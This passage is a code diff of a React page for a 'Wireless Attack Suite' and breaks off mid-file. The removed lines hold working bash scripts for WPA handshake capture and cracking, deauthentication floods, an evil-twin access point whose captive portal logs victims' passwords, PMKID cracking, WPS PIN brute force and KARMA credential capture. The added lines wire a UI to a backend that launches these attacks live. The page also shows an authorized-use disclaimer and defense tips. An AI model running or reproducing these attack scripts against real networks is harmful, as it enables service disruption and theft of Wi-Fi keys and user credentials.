@@ -1,284 +1,274 @@
-import { useState } from "react";
+import { useState, useEffect, useRef, useCallback } from "react";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
-import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
-import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 import { Alert, AlertDescription } from "@/components/ui/alert";
-import { Textarea } from "@/components/ui/textarea";
+import { Slider } from "@/components/ui/slider";
 import { useToast } from "@/hooks/use-toast";
 import { useDocumentTitle } from "@/hooks/useDocumentTitle";
-import { Copy, Check, AlertTriangle, Wifi, Shield, Radio, Lock, Eye, ChevronRight, Play, Scan } from "lucide-react";
+import {
+  Wifi, Shield, Radio, Lock, Eye, AlertTriangle, Play, Square,
+  Terminal, ChevronRight, Check, X, Loader2, RefreshCw, Copy, CheckCheck,
+  Scan, Activity, WifiOff, Info,
+} from "lucide-react";
+import { TrafficConsole } from "@/components/traffic-console";
 
-function CopyButton({ text }: { text: string }) {
+// ─── Types ────────────────────────────────────────────────────────────────────
+
+interface ToolStatus { name: string; available: boolean; path?: string; }
+
+interface JobStatus {
+  jobId: string; active: boolean; exitCode: number | null; signal: string | null;
+  elapsed: number; output: string[]; totalLines: number;
+  config: { technique: string; iface: string; bssid?: string; ssid?: string; channel?: string; duration?: number; };
+}
+
+// ─── Constants ────────────────────────────────────────────────────────────────
+
+const ATTACK_MODES = [
+  {
+    id: "scan", name: "Network Scan", icon: Scan, severity: "info",
+    desc: "Scan for nearby wireless networks using airodump-ng. Discovers BSSIDs, SSIDs, channels, encryption types, and connected clients.",
+    tools: ["airmon-ng", "airodump-ng"],
+    fields: ["iface", "channel", "duration"],
+    notes: "Passive scan — no packets sent to target APs. Safe for recon.",
+  },
+  {
+    id: "handshake", name: "WPA Handshake Capture", icon: Radio, severity: "high",
+    desc: "Capture 4-way WPA/WPA2 handshakes by sending deauth frames to force client reconnection, then crack offline with aircrack-ng.",
+    tools: ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"],
+    fields: ["iface", "bssid", "ssid", "channel", "clientMac", "wordlist", "duration"],
+    notes: "Requires at least one client connected to target AP. BSSID + channel required.",
+  },
+  {
+    id: "deauth", name: "Deauthentication Attack", icon: Wifi, severity: "high",
+    desc: "Force disconnect clients from target AP using forged 802.11 deauthentication frames. Use FF:FF:FF:FF:FF:FF as client MAC to broadcast-deauth all clients.",
+    tools: ["airmon-ng", "aireplay-ng"],
+    fields: ["iface", "bssid", "channel", "clientMac", "duration"],
+    notes: "WPA3/802.11w protected APs resist deauth. Continuous until stopped or duration expires.",
+  },
+  {
+    id: "evil-twin", name: "Evil Twin AP", icon: Eye, severity: "critical",
+    desc: "Create a rogue AP mirroring the target SSID. Deploys a captive portal to capture credentials. Deauths clients from real AP to force them to connect to the clone.",
+    tools: ["airmon-ng", "airbase-ng", "hostapd", "dnsmasq", "python3", "aireplay-ng"],
+    fields: ["iface", "bssid", "ssid", "channel", "duration"],
+    notes: "Requires two wireless interfaces or a secondary interface for the AP. Captured credentials printed in real time.",
+  },
+  {
+    id: "pmkid", name: "PMKID Attack (Clientless)", icon: Lock, severity: "critical",
+    desc: "Clientless WPA2 attack — capture PMKID directly from AP without needing any connected client. Convert to hashcat format and crack offline.",
+    tools: ["airmon-ng", "hcxdumptool", "hcxpcapngtool", "hashcat"],
+    fields: ["iface", "bssid", "wordlist", "duration"],
+    notes: "Most modern WPA2 APs expose PMKID. Duration is capture time — longer = more capture attempts.",
+  },
+  {
+    id: "wps-pin", name: "WPS PIN Brute Force", icon: Shield, severity: "high",
+    desc: "Exploit WPS PIN vulnerability via Pixie Dust (instantly recovers PIN from WPS exchange in seconds) then falls back to brute force if Pixie Dust fails.",
+    tools: ["airmon-ng", "reaver"],
+    fields: ["iface", "bssid", "channel", "duration"],
+    notes: "Pixie Dust works on weak WPS implementations. Many modern APs have WPS lockout — reaver handles backoff.",
+  },
+  {
+    id: "karma", name: "KARMA Attack", icon: Radio, severity: "critical",
+    desc: "Respond to all wireless probe requests to lure devices into connecting automatically. Captures EAP credentials via hostapd-wpe KARMA mode.",
+    tools: ["airmon-ng", "airbase-ng", "hostapd-wpe"],
+    fields: ["iface", "duration"],
+    notes: "Effective against devices with saved open networks in their probe list. EAP/WPA-Enterprise credential capture.",
+  },
+];
+
+const SEVERITY_STYLES: Record<string, string> = {
+  info:     "border-sky-500/50 text-sky-400",
+  high:     "border-severity-high/50 text-severity-high",
+  critical: "border-severity-critical/50 text-severity-critical",
+};
+
+const DEFENSE_TIPS = [
+  "Enable 802.11w (Management Frame Protection) — prevents deauth and disassociation attacks",
+  "Use WPA3-SAE — immune to PMKID attacks and offline dictionary attacks against 4-way handshake",
+  "Disable WPS on all APs — eliminates PIN brute force and Pixie Dust attack surface",
+  "Deploy WIDS (Wireless Intrusion Detection) — detects rogue APs, deauth floods, and probe spoofing",
+  "Use 802.1X/EAP enterprise authentication — prevents credential capture via evil twin portals",
+  "Monitor for sudden client disconnection spikes — indicator of active deauth attack in progress",
+  "Use certificate pinning in enterprise EAP configs — prevents KARMA/evil-twin MiTM on EAP-TLS",
+];
+
+// ─── CopyButton ───────────────────────────────────────────────────────────────
+
+function CopyBtn({ text }: { text: string }) {
   const [copied, setCopied] = useState(false);
   return (
-    <Button size="sm" variant="ghost" onClick={() => { navigator.clipboard.writeText(text); setCopied(true); setTimeout(() => setCopied(false), 2000); }} data-testid="button-copy-wifi-script">
-      {copied ? <Check className="w-4 h-4 text-green-500" /> : <Copy className="w-4 h-4" />}
+    <Button size="sm" variant="ghost" className="h-7 w-7 p-0" onClick={() => {
+      navigator.clipboard.writeText(text);
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+    }} data-testid="button-copy-output">
+      {copied ? <CheckCheck className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
     </Button>
   );
 }
 
-function CodeBlock({ code }: { code: string }) {
+// ─── Tool availability panel ──────────────────────────────────────────────────
+
+function ToolPanel({ tools }: { tools: ToolStatus[] }) {
+  const available = tools.filter(t => t.available).length;
+  const total = tools.length;
   return (
-    <div className="relative">
-      <div className="absolute top-2 right-2"><CopyButton text={code} /></div>
-      <pre className="bg-muted/30 rounded-md p-4 text-[10px] font-mono overflow-x-auto max-h-64 overflow-y-auto">{code}</pre>
+    <div className="space-y-1.5">
+      <div className="flex items-center justify-between">
+        <span className="text-xs text-muted-foreground">Required tools</span>
+        <Badge variant="outline" className={`text-[9px] ${available === total ? "border-green-500/50 text-green-400" : available === 0 ? "border-red-500/50 text-red-400" : "border-amber-500/50 text-amber-400"}`}>
+          {available}/{total} available
+        </Badge>
+      </div>
+      <div className="flex flex-wrap gap-1.5">
+        {tools.map(t => (
+          <div key={t.name} className={`flex items-center gap-1 text-[10px] font-mono px-1.5 py-0.5 rounded border ${t.available ? "border-green-500/30 text-green-400 bg-green-500/5" : "border-red-500/30 text-red-400 bg-red-500/5"}`} data-testid={`tool-status-${t.name}`}>
+            {t.available ? <Check className="w-2.5 h-2.5" /> : <X className="w-2.5 h-2.5" />}
+            {t.name}
+          </div>
+        ))}
+      </div>
+      {available < total && (
+        <p className="text-[10px] text-muted-foreground">Missing tools — install on Kali Linux: <code className="text-amber-400">sudo apt-get install aircrack-ng hcxtools hashcat reaver hostapd-wpe</code></p>
+      )}
     </div>
   );
 }
 
-const ATTACK_MODES = [
-  { id: "handshake", name: "WPA Handshake Capture", icon: Radio, severity: "high", desc: "Capture 4-way WPA/WPA2 handshakes by sending deauth frames to force client reconnection" },
-  { id: "deauth", name: "Deauthentication Attack", icon: Wifi, severity: "high", desc: "Force disconnect clients from target AP using forged 802.11 deauthentication frames (no encryption required)" },
-  { id: "evil-twin", name: "Evil Twin AP", icon: Eye, severity: "critical", desc: "Create a rogue AP that mirrors the target SSID to capture credentials and perform MITM attacks" },
-  { id: "pmkid", name: "PMKID Attack", icon: Lock, severity: "critical", desc: "Clientless WPA2 attack — capture PMKID from AP beacon without needing a connected client" },
-  { id: "wps-pin", name: "WPS PIN Brute Force", icon: Shield, severity: "high", desc: "Exploit WPS PIN vulnerability (Pixie Dust / brute force) to recover WPA passphrase in minutes" },
-  { id: "karma", name: "KARMA Attack", icon: Radio, severity: "critical", desc: "Respond to all wireless probe requests to lure devices into connecting to the rogue AP automatically" },
-];
+// ─── Main component ───────────────────────────────────────────────────────────
 
 export default function WifiAttackPage() {
-  useDocumentTitle("WiFi Attack Suite");
+  useDocumentTitle("Wireless Attack Suite — AegisAI360");
   const { toast } = useToast();
-  const [iface, setIface] = useState("wlan0");
-  const [target_bssid, setTargetBssid] = useState("AA:BB:CC:DD:EE:FF");
-  const [target_channel, setTargetChannel] = useState("6");
-  const [target_ssid, setTargetSsid] = useState("TargetNetwork");
-  const [client_mac, setClientMac] = useState("11:22:33:44:55:66");
-  const [wordlist, setWordlist] = useState("/usr/share/wordlists/rockyou.txt");
-  const [selectedMode, setSelectedMode] = useState(ATTACK_MODES[0]);
-  const [scanResults, setScanResults] = useState<string>("");
-  const [scanning, setScanning] = useState(false);
 
-  const simulateScan = () => {
-    setScanning(true);
-    setTimeout(() => {
-      setScanResults(`BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER AUTH ESSID
-AA:BB:CC:DD:EE:FF  -45   2847    1203   6  130  WPA2 CCMP   PSK  TargetNetwork
-11:22:33:44:55:66  -67    891     234   1   54  WPA2 CCMP   PSK  HomeNetwork_2G
-DE:AD:BE:EF:00:01  -72    445      89  11   54  WPA  TKIP   PSK  OldRouter
-F0:9F:C2:AA:BB:CC  -81    203      12   6  130  OPN             <hidden>
-CC:40:D0:11:22:33  -84    187       5  36  300  WPA2 CCMP   MGT  Corp_Secure
-[WPS Enabled]: AA:BB:CC:DD:EE:FF, 11:22:33:44:55:66
-[Clients]: AA:BB:CC:DD:EE:FF -> 99:88:77:66:55:44 (TargetNetwork)`);
-      setScanning(false);
-      toast({ title: "Scan Complete", description: "7 networks discovered, 2 with WPS enabled" });
-    }, 2000);
+  // Config
+  const [iface, setIface] = useState("wlan0");
+  const [bssid, setBssid] = useState("AA:BB:CC:DD:EE:FF");
+  const [channel, setChannel] = useState("6");
+  const [ssid, setSsid] = useState("TargetNetwork");
+  const [clientMac, setClientMac] = useState("FF:FF:FF:FF:FF:FF");
+  const [wordlist, setWordlist] = useState("/usr/share/wordlists/rockyou.txt");
+  const [duration, setDuration] = useState(60);
+
+  const [selectedMode, setSelectedMode] = useState(ATTACK_MODES[0]);
+
+  // Tool detection
+  const [tools, setTools] = useState<ToolStatus[]>([]);
+  const [toolsLoading, setToolsLoading] = useState(false);
+
+  // Job state
+  const [jobId, setJobId] = useState<string | null>(null);
+  const [jobStatus, setJobStatus] = useState<JobStatus | null>(null);
+  const [launching, setLaunching] = useState(false);
+  const [stopping, setStopping] = useState(false);
+  const pollRef = useRef<NodeJS.Timeout | null>(null);
+  const outputRef = useRef<string[]>([]);
+
+  // Fetch tool availability when technique changes
+  const fetchTools = useCallback(async (technique: string) => {
+    setToolsLoading(true);
+    try {
+      const r = await fetch(`/api/offensive/wireless/tools/${technique}`, { credentials: "include" });
+      if (r.ok) {
+        const data = await r.json();
+        setTools(data.tools ?? []);
+      }
+    } catch {}
+    setToolsLoading(false);
+  }, []);
+
+  useEffect(() => { fetchTools(selectedMode.id); }, [selectedMode.id, fetchTools]);
+
+  // Poll job status
+  const pollJob = useCallback(async (id: string) => {
+    try {
+      const r = await fetch(`/api/offensive/wireless/status/${id}`, { credentials: "include" });
+      if (!r.ok) { clearInterval(pollRef.current!); return; }
+      const data: JobStatus = await r.json();
+      setJobStatus(data);
+      outputRef.current = data.output;
+      if (!data.active) clearInterval(pollRef.current!);
+    } catch {}
+  }, []);
+
+  const startPolling = useCallback((id: string) => {
+    if (pollRef.current) clearInterval(pollRef.current);
+    pollRef.current = setInterval(() => pollJob(id), 800);
+  }, [pollJob]);
+
+  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);
+
+  const handleLaunch = async () => {
+    setLaunching(true);
+    try {
+      const body: Record<string, any> = {
+        technique: selectedMode.id,
+        iface, duration,
+      };
+      if (selectedMode.fields.includes("bssid")) body.bssid = bssid;
+      if (selectedMode.fields.includes("ssid")) body.ssid = ssid;
+      if (selectedMode.fields.includes("channel")) body.channel = channel;
+      if (selectedMode.fields.includes("clientMac")) body.clientMac = clientMac;
+      if (selectedMode.fields.includes("wordlist")) body.wordlist = wordlist;
+
+      const r = await fetch("/api/offensive/wireless/start", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        credentials: "include",
+        body: JSON.stringify(body),
+      });
+      const data = await r.json();
+      if (!r.ok) throw new Error(data.error || "Failed to start");
+
+      setJobId(data.jobId);
+      setJobStatus(null);
+      outputRef.current = [];
+      startPolling(data.jobId);
+      toast({ title: "Attack Launched", description: `${selectedMode.name} started — job ${data.jobId.slice(0, 8)}` });
+    } catch (e: any) {
+      toast({ title: "Launch Failed", description: e.message, variant: "destructive" });
+    }
+    setLaunching(false);
   };
 
-  const getScript = (mode: typeof ATTACK_MODES[0]) => {
-    if (mode.id === "handshake") return `#!/bin/bash
-# AegisAI360 — WPA Handshake Capture | AUTHORIZED USE ONLY
-# Target BSSID: ${target_bssid} | Channel: ${target_channel} | Interface: ${iface}
+  const handleStop = async () => {
+    if (!jobId) return;
+    setStopping(true);
+    try {
+      await fetch(`/api/offensive/wireless/stop/${jobId}`, { method: "DELETE", credentials: "include" });
+      if (pollRef.current) clearInterval(pollRef.current);
+      toast({ title: "Attack Stopped", description: "Process killed" });
+      // Final poll
+      await pollJob(jobId);
+    } catch {}
+    setStopping(false);
+  };
 
-IFACE="${iface}"
-TARGET="${target_bssid}"
-CLIENT="${client_mac}"
-CHANNEL="${target_channel}"
-SSID="${target_ssid}"
+  const handleSelectMode = (mode: typeof ATTACK_MODES[0]) => {
+    if (jobStatus?.active) return;
+    setSelectedMode(mode);
+    setJobId(null);
+    setJobStatus(null);
+    outputRef.current = [];
+  };
 
-echo "[*] Enabling monitor mode..."
-sudo airmon-ng start $IFACE
-MON="${iface}mon"
+  const active = jobStatus?.active ?? false;
+  const fields = selectedMode.fields;
 
-echo "[*] Starting capture on channel $CHANNEL..."
-sudo airodump-ng -c $CHANNEL --bssid $TARGET -w /tmp/capture $MON &
-DUMP_PID=$!
-sleep 3
-
-echo "[*] Sending deauth to force handshake..."
-sudo aireplay-ng --deauth 10 -a $TARGET -c $CLIENT $MON
-
-echo "[*] Waiting for handshake..."
-sleep 5
-kill $DUMP_PID
-
-echo "[*] Cracking with wordlist..."
-sudo aircrack-ng -w ${wordlist} -b $TARGET /tmp/capture*.cap
-echo "[*] Capture saved to /tmp/capture-01.cap"`;
-
-    if (mode.id === "deauth") return `#!/bin/bash
-# AegisAI360 — Deauthentication Attack | AUTHORIZED USE ONLY
-# Disconnects clients from: ${target_bssid} | Channel: ${target_channel}
-
-IFACE="${iface}"
-TARGET="${target_bssid}"
-CLIENT="${client_mac}"  # Use FF:FF:FF:FF:FF:FF for broadcast deauth
-
-echo "[*] Enabling monitor mode..."
-sudo airmon-ng start $IFACE
-MON="${iface}mon"
-
-echo "[*] Setting channel ${target_channel}..."
-sudo iwconfig $MON channel ${target_channel}
-
-echo "[*] Sending deauth frames (continuous)..."
-# Targeted deauth (specific client)
-sudo aireplay-ng --deauth 0 -a $TARGET -c $CLIENT $MON
-
-# Broadcast deauth (disconnect ALL clients)
-# sudo aireplay-ng --deauth 0 -a $TARGET $MON
-
-# Or using mdk4 for stealth broadcast:
-# echo "$TARGET" > /tmp/bl.txt
-# sudo mdk4 $MON d -b /tmp/bl.txt -c ${target_channel}`;
-
-    if (mode.id === "evil-twin") return `#!/bin/bash
-# AegisAI360 — Evil Twin AP + Captive Portal | AUTHORIZED USE ONLY
-# Mirrors SSID: ${target_ssid} on channel ${target_channel}
-
-IFACE="${iface}"
-SSID="${target_ssid}"
-CHANNEL="${target_channel}"
-TARGET="${target_bssid}"
-
-# Step 1: Enable AP mode on second interface
-sudo airmon-ng start $IFACE
-MON="${iface}mon"
-
-# Step 2: Create hostapd config
-cat > /tmp/hostapd_evil.conf << EOF
-interface=at0
-driver=nl80211
-ssid=$SSID
-channel=$CHANNEL
-hw_mode=g
-ignore_broadcast_ssid=0
-EOF
-
-# Step 3: DHCP server config
-cat > /tmp/dnsmasq_evil.conf << EOF
-interface=at0
-dhcp-range=192.168.1.2,192.168.1.254,255.255.255.0,12h
-dhcp-option=3,192.168.1.1
-dhcp-option=6,192.168.1.1
-server=8.8.8.8
-log-queries
-log-dhcp
-listen-address=127.0.0.1
-EOF
-
-# Step 4: Captive portal (Python)
-cat > /tmp/portal.py << 'PYEOF'
-from http.server import HTTPServer, BaseHTTPRequestHandler
-import logging, datetime
-
-class PortalHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
-        self.wfile.write(b'<html><body><h2>Network Login</h2><form method=POST><input name=user placeholder=Username><br><input type=password name=pass placeholder=Password><br><input type=submit value=Connect></form></body></html>')
-    def do_POST(self):
-        length = int(self.headers.get('Content-Length', 0))
-        body = self.rfile.read(length).decode()
-        logging.warning(f"[{datetime.datetime.now()}] CAPTURED: {body}")
-        self.send_response(302)
-        self.send_header('Location', 'http://google.com')
-        self.end_headers()
-
-logging.basicConfig(filename='/tmp/captured_creds.log', level=logging.WARNING)
-HTTPServer(('0.0.0.0', 80), PortalHandler).serve_forever()
-PYEOF
-
-# Step 5: Launch
-sudo ifconfig at0 192.168.1.1 netmask 255.255.255.0 up
-sudo hostapd /tmp/hostapd_evil.conf &
-sudo dnsmasq -C /tmp/dnsmasq_evil.conf -d &
-sudo python3 /tmp/portal.py &
-
-# Step 6: Deauth target AP clients to force reconnect
-sudo aireplay-ng --deauth 0 -a $TARGET $MON
-echo "[*] Evil Twin active. Credentials logged to /tmp/captured_creds.log"`;
-
-    if (mode.id === "pmkid") return `#!/bin/bash
-# AegisAI360 — PMKID Attack (Clientless WPA2) | AUTHORIZED USE ONLY
-# No client required! Captures PMKID directly from AP beacon
-# Target: ${target_bssid} | SSID: ${target_ssid}
-
-IFACE="${iface}"
-TARGET="${target_bssid}"
-WORDLIST="${wordlist}"
-
-echo "[*] Enabling monitor mode..."
-sudo airmon-ng start $IFACE
-MON="${iface}mon"
-
-echo "[*] Capturing PMKID with hcxdumptool..."
-sudo hcxdumptool -i $MON -o /tmp/pmkid.pcapng --enable_status=1 --filterlist_ap=$TARGET --filtermode=2 &
-sleep 15
-kill %1
-
-echo "[*] Converting to hashcat format..."
-hcxpcapngtool -o /tmp/pmkid.hash /tmp/pmkid.pcapng
-
-echo "[*] PMKID hash:"
-cat /tmp/pmkid.hash
-
-echo "[*] Cracking with hashcat (mode 22000)..."
-hashcat -m 22000 /tmp/pmkid.hash $WORDLIST --force
-# For GPU cracking: hashcat -m 22000 /tmp/pmkid.hash $WORDLIST -w 3`;
-
-    if (mode.id === "wps-pin") return `#!/bin/bash
-# AegisAI360 — WPS PIN Attack (Pixie Dust + Brute Force) | AUTHORIZED USE ONLY
-# Target: ${target_bssid} | Channel: ${target_channel}
-
-IFACE="${iface}"
-TARGET="${target_bssid}"
-CHANNEL="${target_channel}"
-
-echo "[*] Enabling monitor mode..."
-sudo airmon-ng start $IFACE
-MON="${iface}mon"
-
-echo "[*] Trying Pixie Dust attack first (fastest)..."
-sudo reaver -i $MON -b $TARGET -c $CHANNEL -vvv -K 1 -f
-
-echo ""
-echo "[*] If Pixie Dust failed, trying brute force PIN..."
-sudo reaver -i $MON -b $TARGET -c $CHANNEL -vvv -d 2 -r 3:15
-# -d 2: delay between attempts, -r 3:15: 3 attempts before 15s lockout pause
-
-echo ""
-echo "[*] Alternative: wifite auto-attack..."
-# sudo wifite --wps --bssid $TARGET -c $CHANNEL`;
-
-    if (mode.id === "karma") return `#!/bin/bash
-# AegisAI360 — KARMA Attack (Auto-SSID Spoofing) | AUTHORIZED USE ONLY
-# Responds to all probe requests — lures devices to connect
-
-IFACE="${iface}"
-
-echo "[*] Enabling monitor mode..."
-sudo airmon-ng start $IFACE
-MON="${iface}mon"
-
-# Hostapd-wpe config for KARMA
-cat > /tmp/karma.conf << EOF
-interface=at0
-driver=nl80211
-ssid=FreeWifi
-channel=6
-hw_mode=g
-wpe_karma=1
-eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
-ca_cert=/etc/hostapd-wpe/certs/ca.pem
-server_cert=/etc/hostapd-wpe/certs/server.pem
-private_key=/etc/hostapd-wpe/certs/server.key
-wpe_logfile=/tmp/karma_creds.log
-EOF
-
-sudo ifconfig at0 10.0.0.1 netmask 255.0.0.0 up
-sudo hostapd-wpe /tmp/karma.conf
-echo "[*] KARMA running — credentials in /tmp/karma_creds.log"`;
-
-    return `# ${mode.name} script placeholder`;
+  const exitBadge = () => {
+    if (!jobStatus || active) return null;
+    if (jobStatus.exitCode === 0) return <Badge variant="outline" className="border-green-500/50 text-green-400 text-[9px]">COMPLETED</Badge>;
+    if (jobStatus.exitCode === 127) return <Badge variant="outline" className="border-red-500/50 text-red-400 text-[9px]">TOOL NOT FOUND</Badge>;
+    if (jobStatus.signal) return <Badge variant="outline" className="border-amber-500/50 text-amber-400 text-[9px]">STOPPED</Badge>;
+    return <Badge variant="outline" className="border-red-500/50 text-red-400 text-[9px]">EXIT {jobStatus.exitCode}</Badge>;
   };
 
   return (
     <div className="p-4 md:p-6 space-y-4">
+      {/* Header */}
       <div>
         <h1 className="text-lg font-bold tracking-wider uppercase flex items-center gap-2">
           <Wifi className="w-5 h-5 text-primary" />
@@ -290,12 +280,13 @@ echo "[*] KARMA running — credentials in /tmp/karma_creds.log"`;
       <Alert className="border-severity-medium/50 bg-severity-medium/10">
         <AlertTriangle className="w-4 h-4 text-severity-medium" />
         <AlertDescription className="text-xs" data-testid="text-wifi-disclaimer">
-          <span className="font-semibold">Authorized Use Only</span> — Wireless attacks against networks without explicit written permission are federal crimes under the CFAA. These scripts are for licensed penetration testers and authorized red team operations only.
+          <span className="font-semibold">Authorized Use Only</span> — Wireless attacks against networks without explicit written permission are federal crimes under the CFAA. These tools are for licensed penetration testers and authorized red team operations only. Requires a monitor-mode capable wireless adapter and Linux with aircrack-ng suite installed (Kali/Parrot recommended).
         </AlertDescription>
       </Alert>
 
       <div className="grid grid-cols-1 xl:grid-cols-4 gap-4">
-        <div className="xl:col-span-1 space-y-4">
+        {/* Left panel — attack modules */}
+        <div className="xl:col-span-1 space-y-3">
           <Card>
             <CardHeader className="pb-2">
               <CardTitle className="text-xs uppercase tracking-wider">Attack Modules</CardTitle>
@@ -303,18 +294,21 @@ echo "[*] KARMA running — credentials in /tmp/karma_creds.log"`;
             <CardContent className="space-y-1.5">
               {ATTACK_MODES.map((mode) => {
                 const Icon = mode.icon;
+                const isSelected = selectedMode.id === mode.id;
                 return (
                   <button
                     key={mode.id}
-                    onClick={() => setSelectedMode(mode)}
+                    onClick={() => handleSelectMode(mode)}
+                    disabled={active}
                     data-testid={`button-wifi-mode-${mode.id}`}
-                    className={`w-full text-left p-2.5 rounded-md border transition-all text-xs ${selectedMode.id === mode.id ? "border-primary bg-primary/10" : "border-border/50 hover:border-primary/40"}`}
+                    className={`w-full text-left p-2.5 rounded-md border transition-all text-xs disabled:opacity-50 disabled:cursor-not-allowed
+                      ${isSelected ? "border-primary bg-primary/10" : "border-border/50 hover:border-primary/40"}`}
                   >
                     <div className="flex items-center gap-2">
                       <Icon className="w-3.5 h-3.5 text-primary shrink-0" />
                       <span className="font-medium">{mode.name}</span>
                     </div>
-                    <Badge variant="outline" className={`text-[9px] mt-1 ${mode.severity === "critical" ? "border-severity-critical/50 text-severity-critical" : "border-severity-high/50 text-severity-high"}`}>
+                    <Badge variant="outline" className={`text-[9px] mt-1 ${SEVERITY_STYLES[mode.severity]}`}>
                       {mode.severity.toUpperCase()}
                     </Badge>
                   </button>
@@ -322,93 +316,216 @@ echo "[*] KARMA running — credentials in /tmp/karma_creds.log"`;
               })}
             </CardContent>
           </Card>
-        </div>
 
-        <div className="xl:col-span-3 space-y-4">
+          {/* Defense tips */}
           <Card>
             <CardHeader className="pb-2">
-              <CardTitle className="text-xs uppercase tracking-wider">Network Scanner</CardTitle>
+              <CardTitle className="text-xs uppercase tracking-wider flex items-center gap-2">
+                <Shield className="w-3.5 h-3.5 text-primary" />
+                Defense Tips
+              </CardTitle>
             </CardHeader>
-            <CardContent className="space-y-3">
-              <div className="grid grid-cols-2 gap-3">
-                <div className="space-y-1">
-                  <Label className="text-xs">Wireless Interface</Label>
-                  <Input value={iface} onChange={(e) => setIface(e.target.value)} className="h-8 text-xs font-mono" placeholder="wlan0" data-testid="input-wifi-iface" />
+            <CardContent className="space-y-1.5">
+              {DEFENSE_TIPS.map((tip, i) => (
+                <div key={i} className="flex items-start gap-1.5 text-[10px] text-muted-foreground">
+                  <ChevronRight className="w-2.5 h-2.5 text-primary mt-0.5 shrink-0" />
+                  <span>{tip}</span>
                 </div>
-                <div className="space-y-1">
-                  <Label className="text-xs">Channel (blank = all)</Label>
-                  <Input value={target_channel} onChange={(e) => setTargetChannel(e.target.value)} className="h-8 text-xs font-mono" placeholder="1-14" data-testid="input-wifi-channel" />
-                </div>
-              </div>
-              <Button onClick={simulateScan} disabled={scanning} size="sm" className="w-full" data-testid="button-wifi-scan">
-                {scanning ? <><Scan className="w-4 h-4 me-2 animate-spin" />Scanning...</> : <><Scan className="w-4 h-4 me-2" />Scan for Networks</>}
-              </Button>
-              {scanResults && (
-                <div>
-                  <pre className="bg-muted/30 rounded-md p-3 text-[10px] font-mono overflow-x-auto" data-testid="text-scan-results">{scanResults}</pre>
-                </div>
-              )}
+              ))}
             </CardContent>
           </Card>
+        </div>
 
+        {/* Right panel — config + terminal */}
+        <div className="xl:col-span-3 space-y-4">
+          {/* Attack config card */}
           <Card>
             <CardHeader className="pb-2">
               <CardTitle className="text-xs uppercase tracking-wider flex items-center gap-2">
                 <selectedMode.icon className="w-4 h-4 text-primary" />
                 {selectedMode.name}
-                <Badge variant="outline" className={`text-[9px] ${selectedMode.severity === "critical" ? "border-severity-critical/50 text-severity-critical" : "border-severity-high/50 text-severity-high"}`}>
+                <Badge variant="outline" className={`text-[9px] ${SEVERITY_STYLES[selectedMode.severity]}`}>
                   {selectedMode.severity.toUpperCase()}
                 </Badge>
+                {active && <Badge variant="outline" className="border-green-500/50 text-green-400 text-[9px] animate-pulse">RUNNING</Badge>}
+                {exitBadge()}
               </CardTitle>
             </CardHeader>
             <CardContent className="space-y-4">
               <p className="text-xs text-muted-foreground">{selectedMode.desc}</p>
 
+              {/* Info note */}
+              <div className="flex items-start gap-2 rounded-md border border-border/40 bg-muted/20 p-2.5">
+                <Info className="w-3.5 h-3.5 text-sky-400 mt-0.5 shrink-0" />
+                <p className="text-[10px] text-muted-foreground">{selectedMode.notes}</p>
+              </div>
+
+              {/* Tool availability */}
+              {toolsLoading
+                ? <div className="flex items-center gap-2 text-xs text-muted-foreground"><Loader2 className="w-3.5 h-3.5 animate-spin" />Checking tool availability...</div>
+                : tools.length > 0 && <ToolPanel tools={tools} />
+              }
+
+              {/* Config fields */}
               <div className="grid grid-cols-2 md:grid-cols-3 gap-3">
                 <div className="space-y-1">
-                  <Label className="text-xs">Target BSSID (MAC)</Label>
-                  <Input value={target_bssid} onChange={(e) => setTargetBssid(e.target.value)} className="h-8 text-xs font-mono" placeholder="AA:BB:CC:DD:EE:FF" data-testid="input-wifi-bssid" />
+                  <Label className="text-xs">Wireless Interface <span className="text-red-400">*</span></Label>
+                  <Input value={iface} onChange={e => setIface(e.target.value)} disabled={active} className="h-8 text-xs font-mono" placeholder="wlan0" data-testid="input-wifi-iface" />
                 </div>
-                <div className="space-y-1">
-                  <Label className="text-xs">Target SSID</Label>
-                  <Input value={target_ssid} onChange={(e) => setTargetSsid(e.target.value)} className="h-8 text-xs font-mono" placeholder="NetworkName" data-testid="input-wifi-ssid" />
-                </div>
-                <div className="space-y-1">
-                  <Label className="text-xs">Client MAC</Label>
-                  <Input value={client_mac} onChange={(e) => setClientMac(e.target.value)} className="h-8 text-xs font-mono" placeholder="11:22:33:44:55:66" data-testid="input-wifi-client" />
-                </div>
-                <div className="col-span-2 md:col-span-3 space-y-1">
-                  <Label className="text-xs">Wordlist Path</Label>
-                  <Input value={wordlist} onChange={(e) => setWordlist(e.target.value)} className="h-8 text-xs font-mono" data-testid="input-wifi-wordlist" />
-                </div>
-              </div>
 
-              <div>
-                <div className="flex items-center justify-between mb-2">
-                  <Label className="text-xs">Attack Script</Label>
-                  <CopyButton text={getScript(selectedMode)} />
-                </div>
-                <CodeBlock code={getScript(selectedMode)} />
-              </div>
-
-              <div className="space-y-2">
-                <Label className="text-xs font-semibold uppercase tracking-wide text-primary">Defense Countermeasures</Label>
-                {[
-                  "Enable 802.11w (Management Frame Protection) — prevents deauth attacks",
-                  "Use WPA3 — immune to PMKID and dictionary attacks against 4-way handshake",
-                  "Disable WPS on all APs — eliminates PIN brute force and Pixie Dust vectors",
-                  "WIDS (Wireless Intrusion Detection) — detect rogue APs and deauth floods",
-                  "802.1X/EAP enterprise auth — prevents credential capture via evil twin",
-                  "Monitor for sudden client disconnections — indicator of deauth attack",
-                ].map((rec, i) => (
-                  <div key={i} className="flex items-start gap-2 text-xs">
-                    <ChevronRight className="w-3 h-3 text-primary mt-0.5 shrink-0" />
-                    <span className="text-muted-foreground">{rec}</span>
+                {fields.includes("bssid") && (
